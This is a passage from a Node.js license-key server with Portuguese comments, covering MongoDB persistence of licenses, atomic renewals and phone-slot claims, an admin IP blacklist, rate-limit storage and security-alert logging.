      keys:           keysDoc?.data && typeof keysDoc.data === 'object' ? keysDoc.data : {},
      logs:           Array.isArray(logsDoc?.data) ? logsDoc.data : [],
      securityAlerts: Array.isArray(alertsDoc?.data) ? alertsDoc.data : [],
    };
  } catch (e) {
    console.error('[DB] Erro ao carregar:', e.message);
    if (opts.allowEmptyOnFailure === true) return { keys: {}, logs: [], securityAlerts: [] };
    throw e;
  }
}

// IPs no Admin são operações de segurança, nunca apenas um cache em memória.
// Lê a verdade persistida. A escrita deve ser confirmada antes de afetar
// ipBlacklist, que é consultado para bloquear requisições.
const ADMIN_IP_BLACKLIST_LIMIT = 5000;
async function readAdminIpBlacklistSnapshot(deps = {}) {
  const db = deps.db || await getMongoDb();
  let doc;
  try {
    doc = await db.collection('settings').findOne(
      { _id: 'main' }, { projection: { ipBlacklist: 1, _id: 0 }, timeoutMS: 7000 }
    );
  } catch (e) { zvmInvalidateMongoOnNetworkError(e, db); throw e; }
  if (doc && doc.ipBlacklist !== undefined && !Array.isArray(doc.ipBlacklist)) {
    throw new Error('invalid_ip_blacklist_store');
  }
  const raw = doc?.ipBlacklist || [];
  const ips = [...new Set(raw.map(normalizeClientIp).filter(Boolean))];
  return { raw, ips };
}
async function mutateAdminIpBlacklistStrict(operation, value, deps = {}) {
  if (operation !== 'add' && operation !== 'remove') throw new Error('invalid_ip_blacklist_operation');
  const ip = normalizeClientIp(value);
  if (!ip) throw new Error('invalid_ip');
  const db = deps.db || await getMongoDb();
  const collection = db.collection('settings');
  // Releitura canônica também entende endereços IPv4-mapped legados.
  const before = await readAdminIpBlacklistSnapshot({ db });
  if (operation === 'add' && before.ips.length >= ADMIN_IP_BLACKLIST_LIMIT && !before.ips.includes(ip)) {
    const error = new Error('ip_blacklist_limit'); error.code = 'ip_blacklist_limit'; throw error;
  }
  if (operation === 'remove' || !before.ips.includes(ip)) {
    // MongoDB modifica somente o elemento desta operação. Nunca sobrescreve
    // a lista inteira: dois administradores podem alterar IPs diferentes.
    // $pull reconhece também a representação legada de um mesmo IP.
    const equivalents = [...new Set([ip, ...before.raw.filter(raw => normalizeClientIp(raw) === ip)])];
    const update = operation === 'add'
      ? { $addToSet: { ipBlacklist: ip }, $set: { updatedAt: new Date() } }
      : { $pull: { ipBlacklist: { $in: equivalents } }, $set: { updatedAt: new Date() } };
    try {
      await collection.updateOne({ _id: 'main' }, update,
        { upsert: operation === 'add', timeoutMS: 7000 });
    } catch (e) { zvmInvalidateMongoOnNetworkError(e, db); throw e; }
  }
  // Confirmar resultado no próprio Mongo antes de mudar cache ou reportar OK.
  const after = await readAdminIpBlacklistSnapshot({ db });
  if (after.ips.includes(ip) !== (operation === 'add')) {
    const error = new Error('ip_blacklist_conflict'); error.code = 'ip_blacklist_conflict'; throw error;
  }
  replaceIpBlacklist(after.ips);
  return { ip, ips: [...ipBlacklist] };
}

async function persistRateBlocks() {
  try {
    const now = Date.now();
    const data = {};
    for (const [k, e] of rateLimitMap.entries()) {
      if (e.blockedUntil > now) data[k] = { count: e.count, resetAt: e.resetAt, blockedUntil: e.blockedUntil };
    }
    const db = await getMongoDb();
    await db.collection('rate_blocks').updateOne(
      { _id: 'blocks' },
      { $set: { data, updatedAt: new Date() } },
      { upsert: true }
    );
  } catch (e) { console.warn('[DB] Erro ao persistir rate blocks:', e.message); }
}

const _saveDebounce = new Map();
// R46.86: login, uso e cron nunca podem regravar a licença inteira.
// Um saveKey agendado antes de uma renovação concorrente poderia reverter
// expiresAt, plano, bloqueio e devices ao sobrescrever data.<key> por completo.
// Somente metadados operacionais são gravados por esta fila legada.
async function _writeKeyToDb(code, deps = {}) {
  const keyCode = String(code || '');
  const source = keys[keyCode];
  if (!/^[a-z0-9_-]{1,64}$/i.test(keyCode) || !source || typeof source !== 'object') return;
  const field = `data.${keyCode}`;
  const update = { updatedAt: new Date() };
  const operationalFields = ['lastUsed', 'lastIp', 'wppVersion', 'deviceId',
    'deviceHistory', 'warnCount', 'warnCountTs', 'usage', 'usageDate'];
  for (const name of operationalFields) {
    if (Object.prototype.hasOwnProperty.call(source, name) && source[name] !== undefined) {
      update[`${field}.${name}`] = cloneKeyRecordForCommit(source[name]);
    }
  }
  try {
    const db = deps.db || await getMongoDb();
    const collection = db.collection('store');
    if (Object.keys(update).length > 1) {
      // Sem upsert: um debounce antigo não pode recriar uma licença removida.
      await collection.updateOne({ _id: 'keys', [field]: { $exists: true } },
        { $set: update }, { timeoutMS: 7000 });
    }
    // Último telefone só é salvo se ainda pertence aos devices persistidos.
    // Um logout/remoção concorrente nunca pode ressuscitar essa associação.
    if (typeof source.lastPhone === 'string' && source.lastPhone) {
      await collection.updateOne(
        { _id: 'keys', [`${field}.phones`]: source.lastPhone },
        { $set: { [`${field}.lastPhone`]: source.lastPhone, updatedAt: new Date() } },
        { timeoutMS: 7000 }
      );
    }
    // Expiração e aviso só podem persistir para A MESMA validade observada.
    // Caso o administrador renove a licença, ambos deixam a nova data intacta.
    const expiryMs = Date.parse(String(source.expiresAt || ''));
    const sameExpiry = Number.isFinite(expiryMs) && source.expiresAt;
    if (sameExpiry && source.active === false && expiryMs <= Date.now()) {
      await collection.updateOne({ _id: 'keys', [`${field}.expiresAt`]: source.expiresAt },
        { $set: { [`${field}.active`]: false, updatedAt: new Date() } }, { timeoutMS: 7000 });
    }
    if (sameExpiry && source.warnEmailSent === true) {
      await collection.updateOne({ _id: 'keys', [`${field}.expiresAt`]: source.expiresAt },
        { $set: { [`${field}.warnEmailSent`]: true, updatedAt: new Date() } }, { timeoutMS: 7000 });
    }
  } catch (e) {
    console.error('[DB] Erro ao salvar metadados operacionais:', e.message);
  }
}
// Compatibilidade histórica: escritor estrito ainda existente para testes
// legados. Rotas de dispositivo não devem usá-lo: usam CAS sobre o banco.
// O debounce e flushPendingSaves usam apenas _writeKeyToDb (metadados).
async function _writeKeyToDbStrict(code, deps = {}) {
  if (keys[code] === undefined) return;
  const db = deps.db || await getMongoDb();
  await db.collection('store').updateOne(
    { _id: 'keys' },
    { $set: { [`data.${code}`]: keys[code], updatedAt: new Date() } },
    { upsert: true }
  );
}

function cloneKeyRecordForCommit(record) {
  if (!record || typeof record !== 'object') return record;
  return JSON.parse(JSON.stringify(record));
}

async function commitAdminKeyRecordStrict(code, record, deps = {}) {
  const keyCode = String(code || '');
  if (!keyCode || !record || typeof record !== 'object') throw new Error('invalid_key_record');
  const next = cloneKeyRecordForCommit(record);
  const db = deps.db || await getMongoDb();
  const filter = { _id: 'keys' };
  const update = { $set: { [`data.${keyCode}`]: next, updatedAt: new Date() } };
  try {
    await db.collection('store').updateOne(filter, update, { upsert: true, timeoutMS: 7000 });
  } catch (error) {
    const lost = zvmInvalidateMongoOnNetworkError(error, db);
    // Mesmo código e mesmo payload tornam seguro repetir um $set cuja
    // confirmação se perdeu. Não gera segunda licença por falha de rede.
    if (!lost || deps.db) throw error;
    const recovered = await getMongoDb();
    try {
      await recovered.collection('store').updateOne(filter, update, { upsert: true, timeoutMS: 7000 });
    } catch (retryError) {
      zvmInvalidateMongoOnNetworkError(retryError, recovered);
      throw retryError;
    }
  }
  keys[keyCode] = next;
  invalidateKeysHtmlCache();
  return keys[keyCode];
}

// No painel Admin, o MongoDB é a autoridade, não a cópia carregada no boot.
// A projeção reduz a leitura para uma chave. Nunca servir cache quando o
// banco não puder confirmar o estado de uma licença administrativa.
async function readAdminKeysSnapshot(deps = {}) {
  const db = deps.db || await getMongoDb();
  let doc;
  try {
    doc = await db.collection('store').findOne(
      { _id: 'keys' }, { projection: { data: 1, _id: 0 }, timeoutMS: 7000 }
    );
  } catch (error) {
    zvmInvalidateMongoOnNetworkError(error, db);
    throw error;
  }
  if (doc && doc.data !== undefined && (typeof doc.data !== 'object' || Array.isArray(doc.data) || doc.data === null)) {
    throw new Error('invalid_admin_key_store');
  }
  return cloneKeyRecordForCommit(doc?.data || {});
}

async function readAdminKeySnapshot(code, deps = {}) {
  const keyCode = String(code || '');
  if (!/^[a-z0-9_-]{1,64}$/i.test(keyCode)) return null;
  const db = deps.db || await getMongoDb();
  let doc;
  try {
    doc = await db.collection('store').findOne(
      { _id: 'keys' }, { projection: { [`data.${keyCode}`]: 1, _id: 0 }, timeoutMS: 7000 }
    );
  } catch (error) {
    zvmInvalidateMongoOnNetworkError(error, db);
    throw error;
  }
  // Preserve BSON values only for an internal atomic CAS read. In particular,
  // activations[] may contain Date instances; JSON cloning here would turn
  // them into strings and make MongoDB's equality predicate never match.
  // All ordinary callers continue receiving detached JSON-safe snapshots.
  const record = doc?.data?.[keyCode];
  if (!record || typeof record !== 'object') return null;
  return deps.preserveBson === true ? record : cloneKeyRecordForCommit(record);
}

// R46.87 — Renovação atômica em uma única operação MongoDB.
// Não compara a licença inteira nem disputa lastUsed/usage/phones.
// Operações de rede com resultado incerto NÃO são reenviadas pelo servidor.
async function renewAdminKeyAtomicStrict(code, totalMinutes, deps = {}) {
  const keyCode = String(code || '');
  if (!/^[a-z0-9_-]{1,64}$/i.test(keyCode)) throw new Error('invalid_key_code');
  if (!Number.isSafeInteger(totalMinutes) || totalMinutes === 0 || Math.abs(totalMinutes) > 5256000) {
    throw new Error('invalid_renewal_duration');
  }
  const operationId = deps.operationId == null ? '' : String(deps.operationId);
  if (operationId && !/^[a-zA-Z0-9_-]{8,100}$/.test(operationId)) {
    throw new Error('invalid_renewal_operation_id');
  }
  const db = deps.db || await getMongoDb();
  const field = `data.${keyCode}`;
  const removing = totalMinutes < 0;
  const rawExpiry = { $convert: {
    input: '$' + field + '.expiresAt', to: 'date', onError: null, onNull: null
  } };
  const expiryValue = { $convert: {
    input: '$' + field + '.expiresAt', to: 'date', onError: '$' + '$NOW', onNull: '$' + '$NOW'
  } };
  const expiryDate = { $dateAdd: {
    startDate: removing ? rawExpiry : { $max: ['$' + '$NOW', expiryValue] },
    unit: 'millisecond', amount: totalMinutes * 60000
  } };
  const update = { [`${field}.expiresAt`]: {
    $dateToString: { format: '%Y-%m-%dT%H:%M:%S.%LZ', date: expiryDate, timezone: 'UTC' }
  }, [`${field}.expireDuration`]: null,
  [`${field}.warnEmailSent`]: false, updatedAt: '$' + '$NOW' };
  // Removing time never reactivates an administratively blocked license.
  if (!removing) update[`${field}.active`] = true;
  if (operationId) update[`${field}.lastAdminRenewalOperationId`] = operationId;
  const filter = { _id: 'keys', [field]: { $type: 'object' } };
  if (operationId) filter[`${field}.lastAdminRenewalOperationId`] = { $ne: operationId };
  if (removing) {
    // MongoDB evaluates the existing expiry + clock in one atomic write.
    // No expiry, expired, or insufficient remaining time => no mutation.
    filter.$expr = { $gt: [rawExpiry, { $dateAdd: {
      startDate: '$' + '$NOW', unit: 'millisecond',
      amount: Math.abs(totalMinutes) * 60000 + 60000
    } }] };
  }
  let changed;
  try {
    changed = await db.collection('store').findOneAndUpdate(filter, [{ $set: update }],
      { projection: { [field]: 1, _id: 0 }, returnDocument: 'after', maxTimeMS: 7000 });
  } catch (error) {
    zvmInvalidateMongoOnNetworkError(error, db);
    throw error;
  }
  // Node driver 6 devolve o documento; o fallback mantém compatibilidade
  // com provedores que ainda devolvem o envelope {value: documento}.
  const doc = changed?.value && changed?.data === undefined ? changed.value : changed;
  let record = doc?.data?.[keyCode] || null;
  let replayed = false;
  if (!record && operationId) {
    const current = await readAdminKeySnapshot(keyCode, { db });
    if (current?.lastAdminRenewalOperationId === operationId) {
      record = current;
      replayed = true;
    }
  }
  if (!record) return null;
  const safeRecord = cloneKeyRecordForCommit(record);
  keys[keyCode] = safeRecord;
  invalidateKeysHtmlCache();
  return { record: safeRecord, replayed };
}

async function mutateAdminKeyRecordStrict(code, mutator, deps = {}) {
  const keyCode = String(code || '');
  if (!/^[a-z0-9_-]{1,64}$/i.test(keyCode)) return null;
  const db = deps.db || await getMongoDb();
  const field = `data.${keyCode}`;
  // R46.88: CAS somente dos campos efetivamente modificados. Comparar todo
  // o registro reprovava datas BSON e disputava telemetria/login desnecessariamente.
  function createPatch(current, draft) {
    const filter = { _id: 'keys', [field]: { $type: 'object' } };
    const changes = { updatedAt: new Date() };
    const removals = {};
    let count = 0;
    function stage(path, beforeExists, before, afterExists, after) {
      if (beforeExists === afterExists &&
          (!beforeExists || JSON.stringify(before) === JSON.stringify(after))) return;
      if (!path.split('.').slice(2).every(segment => /^[A-Za-z_][A-Za-z0-9_-]*$/.test(segment))) {
        throw new Error('invalid_admin_key_field');
      }
      filter[path] = beforeExists ? before : { $exists: false };
      if (afterExists) changes[path] = after;
      else removals[path] = '';
      count++;
    }
    const allFields = new Set([...Object.keys(current), ...Object.keys(draft)]);
    for (const name of allFields) {
      const had = Object.prototype.hasOwnProperty.call(current, name);
      const has = Object.prototype.hasOwnProperty.call(draft, name);
      const prev = current[name], next = draft[name];
      const plainPrev = prev && typeof prev === 'object' && !Array.isArray(prev);
      const plainNext = next && typeof next === 'object' && !Array.isArray(next);
      if (name === 'modules' && plainPrev && plainNext) {
        for (const moduleName of new Set([...Object.keys(prev), ...Object.keys(next)])) {
          stage(field + '.modules.' + moduleName,
            Object.prototype.hasOwnProperty.call(prev, moduleName), prev[moduleName],
            Object.prototype.hasOwnProperty.call(next, moduleName), next[moduleName]);
        }
      } else {
        stage(field + '.' + name, had, prev, has, next);
      }
    }
    const update = { $set: changes };
    if (Object.keys(removals).length) update.$unset = removals;
    return { filter, update, count };
  }
  // Repetir somente após CAS sem correspondência confirmado pelo MongoDB.
  // Nunca repetir após erro de rede: resultado anterior pode ser incerto.
  for (let attempt = 0; attempt < 5; attempt++) {
    // CAS must compare the real BSON types, while the mutator receives a
    // detached copy so that it cannot mutate MongoDB driver objects.
    const current = await readAdminKeySnapshot(keyCode, { db, preserveBson: true });
    if (!current) return null;
    const draft = cloneKeyRecordForCommit(current);
    await mutator(draft);
    const { filter, update, count } = createPatch(current, draft);
    if (!count) return current;
    let result;
    try {
      result = await db.collection('store').findOneAndUpdate(filter, update, {
        projection: { [field]: 1, _id: 0 },
        returnDocument: 'after', maxTimeMS: 7000
      });
    } catch (error) {
      zvmInvalidateMongoOnNetworkError(error, db);
      throw error;
    }
    const doc = result?.value && result?.data === undefined ? result.value : result;
    const saved = doc?.data?.[keyCode];
    if (saved && typeof saved === 'object') {
      keys[keyCode] = cloneKeyRecordForCommit(saved);
      invalidateKeysHtmlCache();
      return keys[keyCode];
    }
    if (attempt < 4) await new Promise(resolve => setTimeout(resolve, 8 * (attempt + 1)));
  }
  const error = new Error('key_write_conflict');
  error.code = 'key_write_conflict';
  throw error;
}

function sendAdminKeyPersistFailure(res, error, action) {
  const conflict = error?.code === 'key_write_conflict';
  if (!conflict) console.error('[ADMIN] falha de persistência em ' + action + ':', error?.message);
  sendJson(res, { ok:false, error:conflict ? 'key_write_conflict' : 'db_unavailable', retryable:true }, conflict ? 409 : 503);
}

async function setAdminKeyDevAccessStrict(code, enabled, deps = {}) {
  if (typeof enabled !== 'boolean') {
    const error = new Error('invalid_dev_access');
    error.code = 'invalid_dev_access';
    throw error;
  }
  return mutateAdminKeyRecordStrict(code, draft => { draft.devAccess = enabled; }, deps);
}
function saveKey(code) {
  if (_saveDebounce.has(code)) clearTimeout(_saveDebounce.get(code));
  const tid = setTimeout(() => { _saveDebounce.delete(code); _writeKeyToDb(code); }, 2000);
  _saveDebounce.set(code, tid);
  invalidateKeysHtmlCache();
  return Promise.resolve();
}
// Descarrega TODAS as gravações debounced pendentes imediatamente (shutdown/deploy)
async function flushPendingSaves() {
  const pending = [..._saveDebounce.keys()];
  for (const tid of _saveDebounce.values()) clearTimeout(tid);
  _saveDebounce.clear();
  if (!pending.length) return;
  console.log(`[SHUTDOWN] Gravando ${pending.length} chave(s) pendente(s)...`);
  await Promise.allSettled(pending.map(c => _writeKeyToDb(c)));
}

async function deleteKeyFromDb(code, deps = {}) {
  const keyCode = String(code || '');
  if (!/^[a-z0-9_-]{1,64}$/i.test(keyCode)) throw new Error('invalid_key_code');
  const db = deps.db || await getMongoDb();
  // A chave precisa existir NO MONGODB no momento do DELETE. Um snapshot antigo
  // nunca deve gerar sucesso ou atualizar o timestamp de um documento inexistente.
  const field = `data.${keyCode}`;
  const result = await db.collection('store').updateOne(
    { _id: 'keys', [field]: { $exists: true } },
    { $unset: { [field]: '' }, $set: { updatedAt: new Date() } }
  );
  if (result.matchedCount !== 1) {
    const error = new Error('key_write_conflict'); error.code = 'key_write_conflict'; throw error;
  }
  if (_saveDebounce.has(keyCode)) { clearTimeout(_saveDebounce.get(keyCode)); _saveDebounce.delete(keyCode); }
  delete keys[keyCode];
  invalidateKeysHtmlCache();
  // Limpeza auxiliar; falha não reverte exclusão de licença já confirmada.
  db.collection('portal_users').updateMany({ keyCode }, { $unset: { keyCode: '' } }).catch(() => {});
}

async function deleteKeysFromDbStrict(codes, deps = {}) {
  const unique = [...new Set((codes || []).map(v => String(v || '')))];
  if (!unique.length || unique.some(code => !/^[a-z0-9_-]{1,64}$/i.test(code))) {
    throw new Error('invalid_admin_batch_codes');
  }
  const db = deps.db || await getMongoDb();
  const unset = Object.fromEntries(unique.map(code => [`data.${code}`, '']));
  const filter = { _id: 'keys' };
  // Remoção atômica de TODAS as chaves selecionadas: se qualquer uma mudou
  // desde a seleção, rejeitar o lote inteiro; jamais confirmar exclusão parcial.
  for (const code of unique) filter[`data.${code}`] = { $exists: true };
  const result = await db.collection('store').updateOne(filter,
    { $unset: unset, $set: { updatedAt: new Date() } });
  if (result.matchedCount !== 1) {
    const error = new Error('key_write_conflict'); error.code = 'key_write_conflict'; throw error;
  }
  for (const code of unique) {
    if (_saveDebounce.has(code)) { clearTimeout(_saveDebounce.get(code)); _saveDebounce.delete(code); }
    delete keys[code];
  }
  invalidateKeysHtmlCache();
  db.collection('portal_users').updateMany({ keyCode: { $in: unique } }, { $unset: { keyCode: '' } }).catch(() => {});
  return unique.length;
}

async function activateDeferredKey(code) {
  if (!keys[code]?.expireDuration) return false;
  const expiresAt   = new Date(Date.now() + keys[code].expireDuration).toISOString();
  const activatedAt = new Date().toISOString();
  const db = await getMongoDb();
  const result = await db.collection('store').updateOne(
    { _id: 'keys', [`data.${code}.expiresAt`]: null },
    { $set: {
        [`data.${code}.expiresAt`]:   expiresAt,
        [`data.${code}.activatedAt`]: activatedAt,
        updatedAt: new Date(),
    }}
  );
  if (result.modifiedCount === 0) {
    // Outro processo já ativou (corrida) — recarrega o estado real do DB
    const fresh = await db.collection('store').findOne({ _id: 'keys' });
    if (fresh?.data?.[code]) keys[code] = sanitizeKeyRecord(fresh.data[code]);
    // Retorna true somente se expiresAt foi gravado por alguém (não perdemos a ativação)
    return !!keys[code]?.expiresAt;
  }
  // Gravação confirmada — atualiza in-memory
  keys[code].expiresAt   = expiresAt;
  keys[code].activatedAt = activatedAt;
  invalidateKeysHtmlCache();
  return true;
}

// ══════════════════════════════════════════════════════════════════════
// Telefone/slot/activation - fonte comercial de verdade CONTINUA sendo
// phones[]/uses (compatibilidade com clientes legados e com o painel
// administrativo, que já lê phones.length ao vivo - nada disso muda).
// Este bloco só adiciona: (1) uma canonicalização única de telefone pra
// comparação, sem reescrever valores legados já persistidos; (2) uma
// primitiva atômica pra reivindicar um slot novo sem corrida; (3) um
// upsert idempotente de metadata opcional em activations[], que nunca
// influencia phones[]/uses.
// ══════════════════════════════════════════════════════════════════════

// Única canonicalização de telefone do servidor - baseada no formato que
// /api/auth/validation/* (o endpoint mais antigo) já usa pra persistir há
// mais tempo: só dígitos, até 20 caracteres. Usada SÓ para comparação -
// nunca reescreve o que já está salvo em phones[] (legado permanece
// intacto), só passa a comparar "+55 (31) 99999-9999" e "5531999999999"
// como o mesmo telefone.
function normalizePhone(value) {
  if (!value) return '';
  return String(value).replace(/\D/g, '').slice(0, 20);
}

// Resincroniza uses = phones.length (tanto em memória quanto no Mongo) -
// nunca confia em uses estar correto de antemão. Achado real na auditoria:
// pelo menos um endpoint legado consegue deixar uses !== phones.length.
// Chamado ao final de toda operação de claimPhoneSlotAtomic, em qualquer
// desfecho, pra que uma chave legada dessincronizada se autocorrija no
// primeiro login novo que passar por aqui.
async function repairUsesAndReturn(keyCode, status) {
  const k = keys[keyCode];
  if (!k) return { status };
  const realUses = Array.isArray(k.phones) ? k.phones.length : 0;
  if (k.uses !== realUses) {
    k.uses = realUses;
    try {
      const db = await getMongoDb();
      await db.collection('store').updateOne(
        { _id: 'keys' },
        { $set: { [`data.${keyCode}.uses`]: realUses, updatedAt: new Date() } }
      );
    } catch (e) { saveKey(keyCode).catch(() => {}); }
  }
  return { status, phones: k.phones, uses: k.uses };
}

// Reivindica um slot de telefone de forma atômica. NÃO muda a semântica
// de "uses" de nenhum outro endpoint (ex. /api/auth/validation/* incrementa
// uses por chamada, de propósito, por fora desta função) - só garante que
// a ENTRADA em phones[] nunca ultrapassa maxUses, mesmo sob concorrência
// entre múltiplas réplicas do processo.
//
// Retorna:
//   { status: 'already_member', phones, uses }  - telefone já estava na lista (relogin), nunca falha mesmo com a chave cheia
//   { status: 'claimed',        phones, uses }  - telefone novo, slot reservado com sucesso
//   { status: 'limit_reached',  phones, uses }  - telefone novo, sem vaga
//
// Atomicidade: o filtro `data.<key>.phones.<maxUses-1>: {$exists:false}`
// (idioma padrão do Mongo pra "array com menos de maxUses itens") + o
// documento único `_id:'keys'` compartilhado por TODAS as chaves fazem o
// MongoDB serializar essas escritas no nível de documento - duas chamadas
// concorrentes (mesmo telefone ou não, mesma chave ou não) nunca são
// aplicadas ao mesmo tempo. Isso só protege contra escritores que passem
// por ESTA função; um escritor antigo que ainda faça read-then-push em
// memória por fora dela ignora esse filtro por completo (ver auditoria -
// atomicidade forte exige TODOS os escritores usando esta primitiva, e
// nenhuma réplica antiga rodando em paralelo).
// opts.syncUses (default true): quando true, resincroniza uses=phones.length
// ao final (comportamento desejado por /extension/v3/key e /api/client/phone,
// onde uses É phones.length). Passe { syncUses: false } em endpoints com
// accounting PRÓPRIO de "uses" (ex. /api/auth/validation/*, que incrementa
// uses por CHAMADA, de propósito, não por telefone único) - nesse caso só a
// inclusão atômica em phones[] acontece aqui, uses fica inteiramente por
// conta do chamador.
async function claimPhoneSlotAtomic(keyCode, rawPhone, maxUses, opts) {
  const syncUses = !opts || opts.syncUses !== false;
  const finish = (status) => syncUses
    ? repairUsesAndReturn(keyCode, status)
    : { status, phones: keys[keyCode]?.phones || [] };

  const phone = normalizePhone(rawPhone);
  if (!phone) return finish('already_member');

  const existing = keys[keyCode];
  if (existing && Array.isArray(existing.phones) && existing.phones.some(p => normalizePhone(p) === phone)) {
    return finish('already_member');
  }

  const db = await getMongoDb();
  const isUnlimited = !(typeof maxUses === 'number' && maxUses > 0);
  const effectiveMax = isUnlimited ? 0 : maxUses;

  const filter = { _id: 'keys' };
  filter[`data.${keyCode}.phones`] = { $ne: phone };
  if (!isUnlimited) filter[`data.${keyCode}.phones.${effectiveMax - 1}`] = { $exists: false };

  const result = await db.collection('store').updateOne(filter, {
    $push: { [`data.${keyCode}.phones`]: phone },
    $set: { [`data.${keyCode}.updatedAt`]: new Date() }
  });

  if (result.modifiedCount === 0) {
    // Outra requisição já inseriu esse telefone, ou o limite foi atingido
    // por uma corrida - recarrega o estado real do Mongo e decide com base
    // nele, nunca com base na leitura em memória de antes da tentativa.
    const fresh = await db.collection('store').findOne({ _id: 'keys' });
    const freshRec = fresh?.data?.[keyCode];
    if (freshRec) keys[keyCode] = sanitizeKeyRecord(freshRec);
    const freshPhones = keys[keyCode]?.phones || [];
    if (freshPhones.some(p => normalizePhone(p) === phone)) {
      return finish('already_member');
    }
    return finish('limit_reached');
  }

  if (!keys[keyCode]) keys[keyCode] = {};
  if (!Array.isArray(keys[keyCode].phones)) keys[keyCode].phones = [];
  if (!keys[keyCode].phones.includes(phone)) keys[keyCode].phones.push(phone);
  return finish('claimed');
}

// Metadata OPCIONAL e aditiva - nunca influencia phones[]/uses (a fonte
// comercial de verdade). Só roda quando deviceId existe: cliente legado
// sem deviceId nunca cria entrada aqui, de propósito (evita registros
// ambíguos {deviceId:null}). Idempotente por phone+deviceId canonicalizados,
// mesmo padrão de updateOne condicional de claimPhoneSlotAtomic - duas
// chamadas concorrentes com o mesmo par nunca resultam em duas entradas.
// Fire-and-forget do ponto de vista do chamador (nunca deve atrasar nem
// bloquear a resposta de login por causa de metadata).
async function upsertActivation(keyCode, rawPhone, deviceId, meta) {
  if (!deviceId) return;
  const phone = normalizePhone(rawPhone);
  if (!phone) return;
  try {
    const db = await getMongoDb();
    const now = new Date();
    const touch = await db.collection('store').updateOne(
      { _id: 'keys' },
      { $set: {
          [`data.${keyCode}.activations.$[a].lastSeenAt`]: now,
          [`data.${keyCode}.activations.$[a].lastIp`]: meta?.ip || null,
          [`data.${keyCode}.activations.$[a].wppVersion`]: meta?.wppVersion || null,
      }},
      { arrayFilters: [{ 'a.phone': phone, 'a.deviceId': deviceId }] }
    );
    if (touch.modifiedCount === 0) {
      const filter = { _id: 'keys' };
      filter[`data.${keyCode}.activations`] = { $not: { $elemMatch: { phone, deviceId } } };
      await db.collection('store').updateOne(filter, {
        $push: { [`data.${keyCode}.activations`]: {
          phone, deviceId, firstSeenAt: now, lastSeenAt: now,
          lastIp: meta?.ip || null, wppVersion: meta?.wppVersion || null
        }}
      });
    }
  } catch (e) { console.error('[activations] upsert falhou (não-crítico):', e.message); }
}

async function saveLogs() {
  try {
    const db = await getMongoDb();
    const cutoff = new Date(Date.now() - LOG_RETENTION_DAYS * 24 * 60 * 60 * 1000).toISOString();
    logs = logs.filter(l => l.timestamp >= cutoff);
    if (logs.length > LOG_MAX) logs = logs.slice(0, LOG_MAX);
    await db.collection('store').updateOne(
      { _id: 'logs' },
      { $set: { _id: 'logs', data: logs, updatedAt: new Date() } },
      { upsert: true }
    );
  } catch (e) {
    console.error('[DB] Erro ao salvar logs:', e.message);
  }
}

let keys              = {};
let freeUsage         = { usageDate: '', byPhone: {} };
let logs              = [];
let securityAlerts    = [];
let sessions          = {};
let portalSessions    = {};
let analyticsSessions = {};
// Sandbox isolado do Laboratório de Testes do Analytics — NUNCA é o mesmo
// objeto que `keys` e NUNCA é persistido na coleção real `store`/`keys` do
// Mongo. Chaves simuladas vivem só aqui (em memória, somem no restart) para
// que processCommercialSale, ao rodar com deps isoladas, seja estruturalmente
// incapaz de tocar uma licença comercial real por acidente.
let _simKeyStore      = {};
let serverReady       = false;
const ipBlacklist     = new Set(); // IPs bloqueados manualmente pelo admin
const keyFailMap      = new Map(); // { keyCode -> { count, ips: Set, firstAt } } — falhas recentes por chave
let _httpServer       = null;
let _pingInterval     = null;
let _caktoWorkerTimer  = null;
let _caktoRecoveryTimer = null;
let _caktoRecoveryStartupTimer = null;
let _caktoRecoveryBusy = false;
let _caktoWorkerBusy   = false;
let _caktoWorkerPromise = null;
const _caktoWorkerId   = `${process.pid}-${crypto.randomBytes(8).toString('hex')}`;
// /status é público; sem cache, cada refresh externo causaria um ping direto
// no MongoDB. Uma janela curta reduz amplificação/DoS sem mascarar incidentes
// por tempo relevante. /health continua independente e barato para o Render.
const PUBLIC_STATUS_DB_CACHE_MS = 15 * 1000;
let _publicStatusCache = { checkedAt: 0, dbOk: false };
let _adminPassSalt    = null;  // gerado aleatoriamente no boot
let _adminPassHash    = null;  // scrypt-64 derivado de ADMIN_PASS
// Derivação imediata — scrypt é memory-hard (N=16384), derrota GPU/rainbow tables.
// Salt aleatório por sessão: o hash não pode ser reutilizado em reinicios.
_adminPassSalt = crypto.randomBytes(16);
_adminPassHash = crypto.scryptSync(ADMIN_PASS, _adminPassSalt, 64, { N: 16384, r: 8, p: 1 });
console.log('[BOOT] ADMIN_PASS derivada com scrypt-64 (N=16384) — OK');

const SEC_ALERT_MAX = 200; // cap em memória para alertas de segurança

// Persiste alertas de segurança na collection 'security_alerts' do MongoDB.
// Operação atômica com $set para evitar race conditions.
async function saveSecurityAlerts() {
  try {
    const db = await getMongoDb();
    await db.collection('security_alerts').updateOne(
      { _id: 'alerts' },
      { $set: { data: securityAlerts.slice(0, SEC_ALERT_MAX), updatedAt: new Date() } },
      { upsert: true }
    );
  } catch (e) { console.warn('[SEC] Erro ao salvar alertas:', e.message); }
}

// Registra um evento de segurança na memória e persiste assincronamente.
// Nunca expõe segredos — campos sensíveis são mascarados antes de chamar.
function addSecurityAlert(category, detail, reqIp) {
  // Ignora alertas originados do próprio servidor (pentest interno / self-ping)
  const normalizedIp = String(reqIp || '');
  if (normalizedIp === '127.0.0.1' || normalizedIp === '::ffff:127.0.0.1' || normalizedIp === '::1') return;
  securityAlerts.unshift({
    category: String(category).slice(0, 40),
    detail:   String(detail).slice(0, 200),
    ip:       normalizedIp.slice(0, 45) || 'N/A',
    ts:       new Date().toISOString(),
  });
  if (securityAlerts.length > SEC_ALERT_MAX) securityAlerts = securityAlerts.slice(0, SEC_ALERT_MAX);
  saveSecurityAlerts().catch(() => {});
}

function _trackKeyFail(keyCode, ip) {
  const now = Date.now();
  let f = keyFailMap.get(keyCode);
  if (!f || now - f.firstAt > 3600000) { f = { count: 0, ips: new Set(), firstAt: now }; keyFailMap.set(keyCode, f); }
  f.count++;
  if (ip) f.ips.add(ip);
  if (f.count >= 10 && f.ips.size >= 3) {
    addSecurityAlert('KEY_HAMMERING', `Chave ${maskLicenseCode(keyCode)} recebeu ${f.count} falhas de ${f.ips.size} IPs distintos em 1h`, ip);
    keyFailMap.delete(keyCode); // reset para não repetir o alerta a cada request
  }
}

function base32Decode(b32) {
  const alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  const normalized = String(b32 || '').toUpperCase().replace(/=+$/, '');
  if (!normalized || /[^A-Z2-7]/.test(normalized)) throw new Error('invalid_base32');
  let bits = 0, val = 0;
  const out = [];
  for (const c of normalized) {
